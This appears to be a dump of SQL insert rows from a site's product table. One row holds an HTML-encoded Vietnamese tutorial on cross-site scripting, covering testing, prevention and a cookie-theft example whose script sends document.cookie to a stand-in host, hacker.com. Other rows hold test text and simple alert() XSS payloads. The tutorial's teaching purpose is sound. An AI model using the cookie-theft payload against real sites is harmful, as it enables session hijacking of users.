(19, 1, 1, 'ádasdasd', '&lt;ul&gt;\r\n	&lt;li&gt;\r\n	&lt;h2&gt;&lt;strong&gt;a&amp;middot;&lt;/strong&gt;&lt;/h2&gt;\r\n	&lt;/li&gt;\r\n	&lt;li&gt;\r\n	&lt;h1&gt;&amp;lt;script&amp;gt;alert(&amp;#39;Website đang bị lỗi XSS!&amp;#39;);&amp;lt;/script&amp;gt;&lt;strong&gt;&amp;agrave; asd &amp;aacute;dasd&lt;/strong&gt;&lt;/h1&gt;\r\n	&lt;/li&gt;\r\n	&lt;li&gt;&lt;strong&gt;&amp;lt;script&lt;/strong&gt;&lt;/li&gt;\r\n	&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-6/p526x296/244770896_1736918246502926_8046956367312517381_n.jpg?_nc_cat=110&amp;amp;ccb=1-5&amp;amp;_nc_sid=730e14&amp;amp;_nc_ohc=xTFQEDO47IgAX932bvl&amp;amp;tn=TJSiN-3kEhW9QUYH&amp;amp;_nc_ht=scontent.fsgn5-10.fna&amp;amp;oh=5c380a9a353ce038873d81aa07b5206f&amp;amp;oe=61683184&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://besthqwallpapers.com/Uploads/20-11-2020/145812/thumb2-mount-fuji-japan-fujisan-autumn-red-trees.jpg&quot; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;\r\n&lt;/ul&gt;\r\n', 'âcscasc', 123, 'images/products/1_1633944667.png', 'files/products/1_1633944667.zip', 0, 1633944667, 1633944667, 0),
(20, 1, 1, 'Kĩ thuật tấn công CROSS-SITE SCRIPTING', '&lt;p&gt;&lt;strong&gt;1.XSS l&amp;agrave; g&amp;igrave;?&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Cross-Site Scripting hay c&amp;ograve;n được gọi tắt l&amp;agrave; XSS (thay v&amp;igrave; gọi tắt l&amp;agrave; CSS để tr&amp;aacute;nh nhầm lẫn với CSS-Cascading Style Sheet của HTML) l&amp;agrave; một kĩ thuật tấn c&amp;ocirc;ng bằng c&amp;aacute;ch ch&amp;egrave;n v&amp;agrave;o c&amp;aacute;c website động (ASP, PHP, CGI, JSP ...) những thẻ HTML hay những đoạn m&amp;atilde; script nguy hiểm c&amp;oacute; thể g&amp;acirc;y nguy hại cho những nạn nh&amp;acirc;n sử dụng.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;2.Lỗi xảy ra như thế n&amp;agrave;o&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Lỗi n&amp;agrave;y xảy ra khi ứng dụng web thu nhận c&amp;aacute;c dữ liệu nguy hiểm được nhập từ hacker. Một website thường chứa c&amp;aacute;c link, th&amp;ocirc;ng qua c&amp;aacute;c link n&amp;agrave;y hacker c&amp;oacute; thể ch&amp;egrave;n c&amp;aacute;c đoạn code v&amp;agrave;o v&amp;agrave; khi người d&amp;ugrave;ng n&amp;agrave;o đ&amp;oacute; sử dụng link n&amp;agrave;y th&amp;igrave; coi như 99% l&amp;agrave; chết, hacker c&amp;oacute; thể th&amp;ocirc;ng qua lỗi n&amp;agrave;y để ch&amp;egrave;n code v&amp;agrave;o site hay link để lấy c&amp;aacute;c th&amp;ocirc;ng tin quan trọng từ nạn nh&amp;acirc;n&lt;/p&gt;\r\n\r\n&lt;p&gt;Phụ thuộc v&amp;agrave;o mục đ&amp;iacute;ch của hacker, những đoạn Javascript được ch&amp;egrave;n v&amp;agrave;o để lấy những th&amp;ocirc;ng tin như:&lt;/p&gt;\r\n\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n	&lt;p&gt;Cookie: hacker c&amp;oacute; thể lấy được cookie của người d&amp;ugrave;ng v&amp;agrave; d&amp;ugrave;ng những th&amp;ocirc;ng tin trong cookie để giả mạo phi&amp;ecirc;n truy cập hoặc lấy những th&amp;ocirc;ng tin nhạy cảm kh&amp;aacute;c được lưu trong cookie.&lt;/p&gt;\r\n	&lt;/li&gt;\r\n	&lt;li&gt;\r\n	&lt;p&gt;Keylogging: hacker c&amp;oacute; thể ghi lại những thao t&amp;aacute;c g&amp;otilde; ph&amp;iacute;m của người d&amp;ugrave;ng bằng c&amp;aacute;ch sử dụng sự kiện trong Javascript v&amp;agrave; gửi tất cả những thao t&amp;aacute;c g&amp;otilde; ph&amp;iacute;m đ&amp;oacute; về cho hắn để thực hiện những mục đ&amp;iacute;ch như đ&amp;aacute;nh cắp c&amp;aacute;c th&amp;ocirc;ng tin nhạy cảm, lấy mật khẩu truy cập website hoặc m&amp;atilde; số thẻ t&amp;iacute;n dụng...&lt;/p&gt;\r\n	&lt;/li&gt;\r\n	&lt;li&gt;\r\n	&lt;p&gt;Phishing: hacker c&amp;oacute; thể thay đổi giao diện của website bằng c&amp;aacute;ch thay đổi cấu tr&amp;uacute;c HTML trong trang web để đ&amp;aacute;nh lừa người d&amp;ugrave;ng. Hacker c&amp;oacute; thể tạo ra những form đăng nhập giả nhằm lừa người d&amp;ugrave;ng đăng nhập v&amp;agrave;o để đ&amp;aacute;nh cắp mật khẩu.&lt;/p&gt;\r\n	&lt;/li&gt;\r\n&lt;/ul&gt;\r\n\r\n&lt;p&gt;Sau đ&amp;oacute; c&amp;aacute;c th&amp;ocirc;ng tin n&amp;agrave;y được gửi tới cho hacker . C&amp;aacute;ch thường d&amp;ugrave;ng của hacker l&amp;agrave; m&amp;atilde; ho&amp;aacute; c&amp;aacute;c phần nguy hiểm của link ( đ&amp;atilde; ch&amp;egrave;n code) th&amp;agrave;nh kiểu HEX ( hoặc c&amp;oacute; thể l&amp;agrave; c&amp;aacute;c h&amp;igrave;nh thức kh&amp;aacute;c ) để l&amp;agrave;m cho nạn nh&amp;acirc;n &amp;iacute;t nghi ngờ khi click v&amp;agrave;o c&amp;aacute;i link nguy hiểm đ&amp;oacute; . Sau đ&amp;oacute; l&amp;agrave; t&amp;igrave;m c&amp;aacute;ch n&amp;agrave;o đ&amp;oacute; để cho nạn nh&amp;acirc;n chịu click v&amp;agrave;o c&amp;aacute;i link đ&amp;oacute;.&lt;/p&gt;\r\n\r\n&lt;p&gt;Hầu hết c&amp;aacute;c ứng dụng web hiện nay d&amp;ugrave;ng cookie để kết hợp 1 t&amp;agrave;i khoản duy nhất cho 1 người d&amp;ugrave;ng n&amp;agrave;o đ&amp;oacute; , nghĩa l&amp;agrave; cookie của người n&amp;agrave;o người đ&amp;oacute; d&amp;ugrave;ng . C&amp;aacute;c webmail , web b&amp;aacute;n h&amp;agrave;ng , nh&amp;agrave; băng , ... đa số đều d&amp;ugrave;ng cookie với mục đ&amp;iacute;ch chứng thực ngừơi d&amp;ugrave;ng , v&amp;agrave; đ&amp;acirc;y l&amp;agrave; c&amp;aacute;i m&amp;agrave; hacker cần .&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;3.XSS hoạt động như thế n&amp;agrave;o?&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Về cơ bản XSS cũng như SQL Injection hay Source Injection, n&amp;oacute; cũng l&amp;agrave; c&amp;aacute;c y&amp;ecirc;u cầu (request) được gửi từ c&amp;aacute;c m&amp;aacute;y client tới server nhằm ch&amp;egrave;n v&amp;agrave;o đ&amp;oacute; c&amp;aacute;c th&amp;ocirc;ng tin vượt qu&amp;aacute; tầm kiểm so&amp;aacute;t của server. N&amp;oacute; c&amp;oacute; thể l&amp;agrave; một request được gửi từ c&amp;aacute;c form dữ liệu hoặc cũng c&amp;oacute; thể đ&amp;oacute; chỉ l&amp;agrave; c&amp;aacute;c URL như l&amp;agrave;&amp;nbsp;&lt;a href=&quot;http://www.example.com/search.cgi?query=&quot; target=&quot;_blank&quot;&gt;http://www.example.com/search.cgi?query=&lt;/a&gt;&amp;lt;script&amp;gt;alert(&amp;#39;Website đang bị lỗi XSS!&amp;#39;);&amp;lt;/script&amp;gt;. V&amp;agrave; rất c&amp;oacute; thể tr&amp;igrave;nh duyệt của bạn sẽ hiện l&amp;ecirc;n một popup th&amp;ocirc;ng b&amp;aacute;o &amp;quot;Website đang bị lỗi XSS!&amp;quot;.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;Image&quot; src=&quot;https://viblo.asia/uploads/images/4f6f0ac4bf7d28677507e141d8a9d9f0641b3e8c//a50755a7a355a0a916a67cc00eb370fe48c13274.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n&lt;code&gt;                 V&amp;iacute; dụ website bị lỗi XSS\r\n&lt;/code&gt;&lt;/pre&gt;\r\n\r\n&lt;p&gt;C&amp;aacute;c đoạn m&amp;atilde; trong thẻ script kh&amp;ocirc;ng hề bị giới hạn bởi ch&amp;uacute;ng ho&amp;agrave;n to&amp;agrave;n c&amp;oacute; thể thay thế bằng một file nguồn tr&amp;ecirc;n một server kh&amp;aacute;c th&amp;ocirc;ng qua thuộc t&amp;iacute;nh src của thẻ script. Cũng ch&amp;iacute;nh v&amp;igrave; lẽ đ&amp;oacute; m&amp;agrave; ch&amp;uacute;ng ta chưa thể lường hết được độ nguy hiểm của c&amp;aacute;c lỗi XSS.&lt;/p&gt;\r\n\r\n&lt;p&gt;Nhưng nếu như c&amp;aacute;c kĩ thuật tấn c&amp;ocirc;ng kh&amp;aacute;c c&amp;oacute; thể l&amp;agrave;m thay đổi được dữ liệu nguồn của web server (m&amp;atilde; nguồn, cấu tr&amp;uacute;c, cơ sở dữ liệu) th&amp;igrave; XSS chỉ g&amp;acirc;y tổn hại đối với website ở ph&amp;iacute;a client m&amp;agrave; nạn nh&amp;acirc;n trực tiếp l&amp;agrave; những người kh&amp;aacute;ch duyệt site đ&amp;oacute;. Tất nhi&amp;ecirc;n đ&amp;ocirc;i khi c&amp;aacute;c hacker cũng sử dụng kĩ thuật n&amp;agrave;y đề deface c&amp;aacute;c website nhưng đ&amp;oacute; vẫn chỉ tấn c&amp;ocirc;ng v&amp;agrave;o bề mặt của website. Thật vậy, XSS l&amp;agrave; những Client-Side Script, những đoạn m&amp;atilde; n&amp;agrave;y sẽ chỉ chạy bởi tr&amp;igrave;nh duyệt ph&amp;iacute;a client do đ&amp;oacute; XSS kh&amp;ocirc;ng l&amp;agrave;m ảnh hưởng đến hệ thống website nằm tr&amp;ecirc;n server.&lt;/p&gt;\r\n\r\n&lt;p&gt;Mục ti&amp;ecirc;u tấn c&amp;ocirc;ng của XSS kh&amp;ocirc;ng ai kh&amp;aacute;c ch&amp;iacute;nh l&amp;agrave; những người sử dụng kh&amp;aacute;c của website, khi họ v&amp;ocirc; t&amp;igrave;nh v&amp;agrave;o c&amp;aacute;c trang c&amp;oacute; chứa c&amp;aacute;c đoạn m&amp;atilde; nguy hiểm do c&amp;aacute;c hacker để lại họ c&amp;oacute; thể bị chuyển tới c&amp;aacute;c website kh&amp;aacute;c, đặt lại homepage, hay nặng hơn l&amp;agrave; mất mật khẩu, mất cookie thậm ch&amp;iacute; m&amp;aacute;y t&amp;iacute;nh bạn c&amp;oacute; thể sẽ bị c&amp;agrave;i c&amp;aacute;c loại virus, backdoor, worm ..&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;4.Kiểm tra lỗi XSS&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;Bước 1:&lt;/strong&gt;&amp;nbsp;Mở website cần kiểm tra&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;Bước 2:&lt;/strong&gt;&amp;nbsp;Bắt đầu kiểm tra , định vị 1 &amp;ocirc; t&amp;igrave;m kiếm hoặc 1 login form v&amp;agrave; gửi th&amp;ocirc;ng tin đi (nhập th&amp;ocirc;ng tin v&amp;agrave; nhấn submit hay login hay ok g&amp;igrave; đ&amp;oacute; ). V&amp;iacute; dụ nhập text: &amp;quot;Test th&amp;ocirc;i hị hị KCRD&amp;quot;.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;Bước 3:&lt;/strong&gt;&amp;nbsp;X&amp;aacute;c định khả năng site c&amp;oacute; bị lỗi XSS hay kh&amp;ocirc;ng bằng c&amp;aacute;ch xem th&amp;ocirc;ng tin trả về. V&amp;iacute; dụ bạn thấy thế n&amp;agrave;y:&lt;/p&gt;\r\n\r\n&lt;p&gt;&amp;quot;Your search for &amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39; did not find any items&amp;quot; &amp;quot;Your search for &amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39; returned the following results&amp;quot; &amp;quot;User &amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39; is not valid&amp;quot; &amp;quot;Invalid login &amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39;&amp;quot; hoặc l&amp;agrave; c&amp;aacute;i g&amp;igrave; đ&amp;oacute; m&amp;agrave; c&amp;oacute; d&amp;iacute;nh tới chữ &amp;quot;Test th&amp;ocirc;i hị hị hị KCRD&amp;quot; m&amp;agrave; bạn nhập v&amp;agrave;o ban đầu th&amp;igrave; 99% trang n&amp;agrave;y bị lỗi XSS.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;Image&quot; src=&quot;https://viblo.asia/uploads/images/4f6f0ac4bf7d28677507e141d8a9d9f0641b3e8c//3976d927e6d1cb36654f17073144370820aa44b8.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n&lt;code&gt;                                                                                          Website c&amp;oacute; khả năng cao bị lỗi XSS\r\n&lt;/code&gt;&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;Bước 4:&lt;/strong&gt;&amp;nbsp;Ch&amp;egrave;n code thực sự v&amp;agrave;o nơi bị lỗi. Bạn c&amp;oacute; thể ch&amp;egrave;n:&lt;/p&gt;\r\n\r\n&lt;p&gt;&amp;lt;script&amp;gt;alert(&amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39;)&amp;lt;/script&amp;gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;&amp;lt;i*g csstest=javascript:alert(&amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39;)&amp;gt; &amp;amp;{alert(&amp;#39;Test th&amp;ocirc;i hị hị KCRD&amp;#39;)}; v&amp;agrave;o &amp;ocirc; t&amp;igrave;m kiếm v&amp;agrave; nhấn &amp;quot;Search&amp;quot;. Nếu sau đ&amp;oacute; bạn nhận được 1 popup c&amp;oacute; chữ &amp;quot;Test th&amp;ocirc;i hị hị KCRD&amp;quot; th&amp;igrave; trang web n&amp;agrave;y đ&amp;atilde; bị d&amp;iacute;nh lỗi XSS.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;Image&quot; src=&quot;https://viblo.asia/uploads/images/4f6f0ac4bf7d28677507e141d8a9d9f0641b3e8c//080d795def4d7749c1dce1d8c964ae2876aa94c8.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n&lt;code&gt;                                                                                              X&amp;aacute;c định website bị lỗi XSS sau khi javascript hoạt động v&amp;agrave; show popup\r\n&lt;/code&gt;&lt;/pre&gt;\r\n\r\n&lt;p&gt;Nhưng thỉnh thoảng vẫn c&amp;oacute; trường hợp website đ&amp;oacute; bị d&amp;iacute;nh lỗi XSS nhưng vẫn kh&amp;ocirc;ng xuất hiện c&amp;aacute;i popup th&amp;igrave; buộc l&amp;ograve;ng bạn phải view sources để xem. Khi view source kiểm tra d&amp;ograve;ng &amp;lt;script&amp;gt;alert(&amp;lsquo;Test th&amp;ocirc;i hị hị KCRD&amp;rsquo;)&amp;lt;/script&amp;gt;, nếu c&amp;oacute; th&amp;igrave; c&amp;oacute; nghĩa l&amp;agrave; website d&amp;iacute;nh lỗi XSS.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;Image&quot; src=&quot;https://viblo.asia/uploads/images/4f6f0ac4bf7d28677507e141d8a9d9f0641b3e8c//aaf74e5f0c218875156291568cbf332568237be6.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Qua 4 bước tr&amp;ecirc;n ta c&amp;oacute; thể x&amp;aacute;c định website c&amp;oacute; bị lỗi XSS hay kh&amp;ocirc;ng. Sau khi đ&amp;atilde; x&amp;aacute;c định được website bị lỗi XSS, ch&amp;uacute;ng ta c&amp;oacute; thể dựa v&amp;agrave;o đ&amp;oacute; để thực hiện việc tấn c&amp;ocirc;ng. 1 v&amp;iacute; dụ điển h&amp;igrave;nh l&amp;agrave; đ&amp;aacute;nh cắp cookie của tr&amp;igrave;nh duyệt. Như ch&amp;uacute;ng ta đ&amp;atilde; biết, c&amp;aacute;c website sử dụng cookie lưu tr&amp;ecirc;n m&amp;aacute;y người d&amp;ugrave;ng để định dạng người d&amp;ugrave;ng. Mỗi khi client gửi request l&amp;ecirc;n server với cookie đ&amp;atilde; được server trả về từ trước, server sẽ kh&amp;ocirc;ng cần phải hỏi lại c&amp;aacute;c th&amp;ocirc;ng tin x&amp;aacute;c thực user nữa (kiểu như email v&amp;agrave; password), thay v&amp;agrave;o đ&amp;oacute; dựa v&amp;agrave;o cookie server sẽ biết lu&amp;ocirc;n user l&amp;agrave; ai v&amp;agrave; cung cấp c&amp;aacute;c quyền tương ứng. Dựa v&amp;agrave;o đặc t&amp;iacute;nh của cookie, sau khi đ&amp;aacute;nh cắp cookie của người d&amp;ugrave;ng (victim), hacker c&amp;oacute; thể login truy cập v&amp;agrave;o trang web với quyền của victim m&amp;agrave; kh&amp;ocirc;ng cần username v&amp;agrave; password.&lt;/p&gt;\r\n\r\n&lt;p&gt;Sau đ&amp;acirc;y l&amp;agrave; c&amp;aacute;c bước cơ bản cho việc đ&amp;aacute;nh cắp cookie.&lt;/p&gt;\r\n\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n	&lt;p&gt;Tạo 1 file nhận cookie từ ph&amp;iacute;a client v&amp;agrave; post l&amp;ecirc;n host của hacker. File c&amp;oacute; thể access th&amp;ocirc;ng qua link:&amp;nbsp;&lt;a href=&quot;http://hacker.com/get_cookie&quot; target=&quot;_blank&quot;&gt;http://hacker.com/get_cookie&lt;/a&gt;&lt;/p&gt;\r\n	&lt;/li&gt;\r\n	&lt;li&gt;\r\n	&lt;p&gt;Gửi cho nạn nh&amp;acirc;n 1 link c&amp;oacute; dạng:&amp;nbsp;&lt;a href=&quot;http://search.com/?query=&quot; target=&quot;_blank&quot;&gt;http://search.com?query=&lt;/a&gt;&amp;lt;script&amp;gt;window.open(&amp;quot;&lt;a href=&quot;http://www.hacker.com/get_cookie?cookie=&quot; target=&quot;_blank&quot;&gt;http://www.hacker.com/get_cookie?cookie=&lt;/a&gt;&amp;quot;+document.cookie)&amp;lt;/script&amp;gt; Như vậy ngay sau khi user click v&amp;agrave;o đường link tr&amp;ecirc;n, cookie sẽ được tự động gửi đến trang&amp;nbsp;&lt;a href=&quot;http://hacker.com/get_cookie&quot; target=&quot;_blank&quot;&gt;http://hacker.com/get_cookie&lt;/a&gt;, v&amp;agrave; như vậy, cookie của user sẽ bị đ&amp;aacute;nh cắp.&lt;/p&gt;\r\n	&lt;/li&gt;\r\n&lt;/ul&gt;\r\n\r\n&lt;p&gt;H&amp;igrave;nh vẽ dưới đ&amp;acirc;y mổ phỏng việc user đ&amp;atilde; bị đ&amp;aacute;nh cắp cookie v&amp;agrave; hacker &amp;quot;th&amp;ocirc;ng b&amp;aacute;o&amp;quot; cho user điều đ&amp;oacute;. Trong thực tế th&amp;igrave; điều n&amp;agrave;y đương nhi&amp;ecirc;n sẽ kh&amp;ocirc;ng xảy ra, v&amp;agrave; user b&amp;igrave;nh thường cũng kh&amp;ocirc;ng để &amp;yacute; cookie của m&amp;igrave;nh l&amp;agrave; g&amp;igrave;.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;Image&quot; src=&quot;https://viblo.asia/uploads/images/4f6f0ac4bf7d28677507e141d8a9d9f0641b3e8c//7e154d4ae876d64fa07bd69e990f3d7ae3cdd0ec.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n&lt;code&gt;         Trường hợp user đ&amp;atilde; bị đ&amp;aacute;nh cắp cookie\r\n&lt;/code&gt;&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;5.Ph&amp;aacute;t hiện XSS bằng c&amp;aacute;ch n&amp;agrave;o?&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Nếu như c&amp;aacute;c bạn sử dụng c&amp;aacute;c m&amp;atilde; nguồn của c&amp;aacute;c chương tr&amp;igrave;nh c&amp;oacute; sẵn bạn c&amp;oacute; thể tham khảo danh s&amp;aacute;ch c&amp;aacute;c lỗ hổng của chương tr&amp;igrave;nh bạn tr&amp;ecirc;n c&amp;aacute;c trang web chứa c&amp;aacute;c th&amp;ocirc;ng tin về bảo mật như&amp;nbsp;&lt;a href=&quot;http://securityfocus.com/&quot; target=&quot;_blank&quot;&gt;securityfocus.com&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;http://securiteam.com/&quot; target=&quot;_blank&quot;&gt;securiteam.com&lt;/a&gt;,... Tuy nhi&amp;ecirc;n nếu c&amp;aacute;c website được tự viết m&amp;atilde; nguồn th&amp;igrave; bạn kh&amp;ocirc;ng thể &amp;aacute;p dụng phương ph&amp;aacute;p tr&amp;ecirc;n. Trong trường hợp n&amp;agrave;y bạn cần đến c&amp;aacute;c chương tr&amp;igrave;nh scanner tự động. Nếu như bạn sử dụng trong m&amp;ocirc;i trường Windows bạn c&amp;oacute; thể d&amp;ugrave;ng N-Stealth hay AppScan, đ&amp;oacute; l&amp;agrave; những chương tr&amp;igrave;nh scan kh&amp;aacute; tuyệt, bạn kh&amp;ocirc;ng chỉ kiểm tra được c&amp;aacute;c lỗi XSS m&amp;agrave; n&amp;oacute; c&amp;ograve;n cho ph&amp;eacute;p bạn kiểm tra c&amp;aacute;c lỗi kh&amp;aacute;c trong Website đ&amp;oacute;, Server đ&amp;oacute;. Tất nhi&amp;ecirc;n đ&amp;acirc;u phải l&amp;uacute;c n&amp;agrave;o bạn cũng cần kiểm tra tất cả, nếu như bạn chỉ muốn kiểm tra c&amp;aacute;c lỗi XSS c&amp;oacute; trong website, bạn chỉ cần sử dụng screamingCSS. Đ&amp;oacute; l&amp;agrave; một Perl Script sẽ mở c&amp;aacute;c kết nối tới website (sử dụng Perl&amp;#39;s socket) để kiểm tra c&amp;aacute;c lỗi XSS của bạn. Hơn nữa bạn c&amp;oacute; thể sử dụng n&amp;oacute; trong cả m&amp;ocirc;i trường Unix lẫn Windows.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;6.Ngăn ngừa XSS như thế n&amp;agrave;o?&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Người ta kh&amp;ocirc;ng lường hết được mức độ nguy hiểm của XSS nhưng cũng kh&amp;ocirc;ng qu&amp;aacute; kh&amp;oacute; khăn để ngăn ngừa XSS. C&amp;oacute; rất nhiều c&amp;aacute;ch để c&amp;oacute; thể giải quyết vấn đề n&amp;agrave;y. OWASP (The Open Web Application Standard Project) n&amp;oacute;i rằng để c&amp;oacute; thể x&amp;acirc;y dựng c&amp;aacute;c website bảo mật cao, đối với c&amp;aacute;c dữ liệu của người sử dụng bạn n&amp;ecirc;n:&lt;/p&gt;\r\n\r\n&lt;ul&gt;\r\n	&lt;li&gt;Chỉ chấp nhận những dữ liệu hợp lệ.&lt;/li&gt;\r\n	&lt;li&gt;Từ chối nhận c&amp;aacute;c dữ liệu hỏng.&lt;/li&gt;\r\n	&lt;li&gt;Li&amp;ecirc;n tục kiểm tra v&amp;agrave; thanh lọc dữ liệu.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n\r\n&lt;p&gt;Tuy nhi&amp;ecirc;n tr&amp;ecirc;n thực tế, một số trường hợp bạn phải chấp nhận mọi loại dữ liệu hay kh&amp;ocirc;ng c&amp;oacute; một bộ lọc ph&amp;ugrave; hợp. Ch&amp;iacute;nh v&amp;igrave; vậy bạn phải c&amp;oacute; những c&amp;aacute;ch ri&amp;ecirc;ng để giải quyết. Một trong những c&amp;aacute;ch hay sử dụng l&amp;agrave; bạn m&amp;atilde; ho&amp;aacute; c&amp;aacute;c k&amp;iacute; tự đặc biệt trước khi in ra website, nhất l&amp;agrave; những g&amp;igrave; c&amp;oacute; thể g&amp;acirc;y nguy hiểm cho người sử dụng. Trong trường hợp n&amp;agrave;y thẻ script sẽ được đổi th&amp;agrave;nh script. Như vậy n&amp;oacute; sẽ vẫn được in ra m&amp;agrave;n h&amp;igrave;nh m&amp;agrave; kh&amp;ocirc;ng hề g&amp;acirc;y nguy hiểm cho người sử dụng. H&amp;igrave;nh dưới đ&amp;acirc;y l&amp;agrave; 1 v&amp;iacute; dụ trang web cho ph&amp;eacute;p hiển thị tất cả dữ liệu nhập v&amp;agrave;o nhưng kh&amp;ocirc;ng g&amp;acirc;y ra bất kỳ ảnh hưởng n&amp;agrave;o đến người d&amp;ugrave;ng. Nh&amp;igrave;n v&amp;agrave;o source code của trang, ch&amp;uacute;ng ta c&amp;oacute; thể thấy c&amp;aacute;c k&amp;yacute; tự đặc biệt đều đ&amp;atilde; được m&amp;atilde; h&amp;oacute;a v&amp;agrave; script trở n&amp;ecirc;n v&amp;ocirc; hại.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;Image&quot; src=&quot;https://viblo.asia/uploads/images/4f6f0ac4bf7d28677507e141d8a9d9f0641b3e8c//dc816c00605539703521113679cfbf897b28ee66.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n&lt;code&gt;           Ph&amp;ograve;ng ngừa XSS bằng c&amp;aacute;ch m&amp;atilde; h&amp;oacute;a c&amp;aacute;c k&amp;yacute; tự đặc biệt\r\n&lt;/code&gt;&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;7.Nh&amp;igrave;n nhận về XSS dưới quan điểm của 1 tester&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;Nếu như coder sẽ phải t&amp;igrave;m hiểu để ph&amp;ograve;ng trống XSS bằng c&amp;aacute;ch sửa ch&amp;iacute;nh những d&amp;ograve;ng code của m&amp;igrave;nh, th&amp;igrave; tester cần l&amp;agrave;m sao để &amp;quot;thấy&amp;quot; được c&amp;agrave;ng nhiều lỗi XSS c&amp;agrave;ng tốt. Hay n&amp;oacute;i c&amp;aacute;ch kh&amp;aacute;c l&amp;agrave; ph&amp;aacute;t hiện tất cả c&amp;aacute;c lỗi XSS c&amp;oacute; thể của hệ thống. Để l&amp;agrave;m được việc n&amp;agrave;y, c&amp;aacute;c test case cần được cập nhật th&amp;ecirc;m những case cho XSS. Đảm bảo rằng tr&amp;ecirc;n mọi m&amp;agrave;n h&amp;igrave;nh của hệ thống, script m&amp;agrave; user nhập v&amp;agrave;o kh&amp;ocirc;ng được chạy cũng l&amp;agrave; 1 dấu hiệu tốt đảm bảo hệ thống kh&amp;ocirc;ng mắc lỗi XSS.&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;em&gt;&lt;strong&gt;T&amp;agrave;i liệu tham khảo&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;C&amp;aacute;c kiểu khai th&amp;aacute;c XSS &amp;ndash; Phần 1: Reflected XSS&amp;nbsp;&lt;a href=&quot;http://securitydaily.net/ky-thuat-khai-thac-xss-phan-1-reflected-xss/&quot; target=&quot;_blank&quot;&gt;http://securitydaily.net/ky-thuat-khai-thac-xss-phan-1-reflected-xss/&lt;/a&gt;&amp;nbsp;Cross Site Scripting - XSS l&amp;agrave; g&amp;igrave;?&amp;nbsp;&lt;a href=&quot;http://passionery.blogspot.com/2014/05/cross-site-scripting-xss-la-gi.html#.VJJ8OyusVly&quot; target=&quot;_blank&quot;&gt;http://passionery.blogspot.com/2014/05/cross-site-scripting-xss-la-gi.html#.VJJ8OyusVly&lt;/a&gt;&amp;nbsp;T&amp;Igrave;M HIỂU LỖ HỔNG CROSS-SITE SCRIPTING (XSS)&amp;nbsp;&lt;a href=&quot;http://tek.eten.vn/tim-hieu-cross-site-scriptingxss&quot; target=&quot;_blank&quot;&gt;http://tek.eten.vn/tim-hieu-cross-site-scriptingxss&lt;/a&gt;&amp;nbsp;KỸ THUẬT TẤN C&amp;Ocirc;NG V&amp;Agrave; C&amp;Aacute;CH PH&amp;Ograve;NG CHỐNG LỖI XSS TR&amp;Ecirc;N WEBSITE&amp;nbsp;&lt;a href=&quot;http://me.zing.vn/zb/dt/love_cute61/17414418?from=sortfull&quot; target=&quot;_blank&quot;&gt;http://me.zing.vn/zb/dt/love_cute61/17414418?from=sortfull&lt;/a&gt;&lt;/p&gt;\r\n', 'Cross-Site Scripting (XSS) là một trong những kĩ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người ', 123123123, 'images/products/1_1633944861.png', 'files/products/1_1633944861.zip', 1, 1633944861, 1633944861, 0),
(21, 1, 1, 'Kĩ thuật tấn công CROSS-SITE SCRIPTING', '&lt;p&gt;&amp;lt;script&amp;gt;alert(&amp;#39;Website đang bị lỗi XSS!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/p&gt;\r\n', 'Cross-Site Scripting (XSS) là một trong những kĩ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người ', 123123123, 'images/products/1_1633944913.png', 'files/products/1_1633944913.zip', 1, 1633944913, 1633944913, 0),
